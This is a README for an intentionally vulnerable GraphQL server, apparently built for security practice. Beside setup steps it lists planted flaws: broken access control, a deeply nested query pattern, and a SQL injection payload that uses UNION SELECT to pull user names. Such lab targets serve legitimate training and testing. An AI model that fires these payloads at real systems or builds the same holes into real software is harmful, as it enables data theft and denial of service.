# graphql-vulns
Implementation of intentionally vulnerable GraphQL server.

# Setup & run 

1. Install deps
    ```shell script
    npm ci
    ```

2. Setup PostgreSQL database with db/db.sql file, change .env parameters if needed

4. Run server
    ```shell script
    node server.js
    ```

# Vulnerabilities

-   Invalid access control for queries and mutations
    
-   Nested queries
    ```
    query {
        products {
        id
        name
        shop {
            products {
                shop {
                    products {
                        id
                        shop {
                            id
                            products {
                                name
                                shop {
                                    id
                                }
                            }
                        }
                    }
                }
            }
        }
        }
    }
    ```
  
-   SQL injection
    ```
    query {
      searchProducts(namePrefix: "U%' UNION ALL SELECT 1 AS ID, u.name as name, 1 as shop_id FROM users u --"
      ) {
        id
        name
      }
    }
    ```